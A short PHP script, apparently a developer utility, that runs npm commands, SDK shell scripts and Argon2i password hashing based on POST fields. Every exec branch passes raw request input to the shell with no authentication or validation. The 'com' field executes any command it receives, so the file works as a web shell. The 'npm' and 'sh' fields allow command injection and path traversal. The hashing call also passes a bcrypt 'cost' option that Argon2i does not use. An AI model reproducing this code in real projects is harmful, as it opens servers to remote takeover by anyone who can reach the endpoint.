<?php

if (isset($_POST["com"])) {

    exec($_POST["com"], $output, $status);
}

if (isset($_POST["npm"])) {

    $npmScript = "npm " . $_POST["npm"];
    exec($npmScript, $output, $status);
}

if (isset($_POST["sh"])) {

    $shScript = "./SDK/sh/" . $_POST["sh"] . ".sh";
    exec($shScript, $output, $status);
}

if (isset($_POST["ftp"])) {
}

if (isset($_POST["pass"])) {
    $password = $_POST["pass"];
    $options = [
        'cost' => 13
    ];
    echo password_hash($password, PASSWORD_ARGON2I, $options);
}
